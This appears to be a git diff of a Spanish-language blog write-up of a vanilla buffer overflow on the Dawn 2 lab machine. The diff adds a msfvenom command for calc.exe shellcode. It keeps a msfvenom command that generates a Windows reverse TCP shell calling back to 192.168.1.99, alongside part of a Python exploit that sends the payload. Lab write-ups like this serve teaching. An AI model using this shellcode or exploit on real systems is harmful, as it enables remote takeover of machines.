@@ -178,12 +178,17 @@ Se envia el payload y, efectivamente, despues de llenar de basura con 'A's el st
 
 <p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210721171402.png" height="500" width="825" /></p>
 
-El siguiente paso a realizar será la creación de la shellcode, en este caso una shell reversa por TCP, para generarla simplemente se hará uso de msfvenom:
+El siguiente paso a realizar será la creación de la shellcode, en este caso una calculadora, para generarla simplemente se hará uso de msfvenom:
+
+```bash
+msfvenom -a x86 -p windows/exec CMD=calc.exe -f c -b '\x00'
+```
+
+Aunque también se podrá generar una shell reversa por TCP y de esta manera tomar control de la máquina:
 
 ```bash
 msfvenom -a x86 -p windows/shell/reverse_tcp LHOST=192.168.1.99 LPORT=9001 -f c -b '\x00 EXITFUNC=thread'
 ```
-
 > Se utiliza la opción EXITFUNC=thread, esto significa que el código de shell se generará como un hilo remoto en lugar de generar desde el flujo de código original, evitando que el programa se bloquee al finalizar la ejecución.
 
 De esta manera se podrá desarrollar el exploit final. También será necesario añadir instrucciones adicionales de NoP (\x90) que se analizarán después del PUSH ESP, estas instrucciones básicamente dicen: "ir a la siguiente instrucción". Se agregan estos para que la carga útil no se mezcle con otras instrucciones, corrompiéndola:
@@ -203,6 +208,7 @@ print("Sending payload")
 s.send(buffer)
 s.close()
 ```
+<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210721201618.png" height="500" width="825" /></p>
 
 Se puede utilizar el módulo struct para convertir el valor HEX en little-endian y no tener que reversear la dirección poniendola en hexadecimal manualmente:
 > Documentación de la librería struct: [https://docs.python.org/3/library/struct.html](https://docs.python.org/3/library/struct.html)
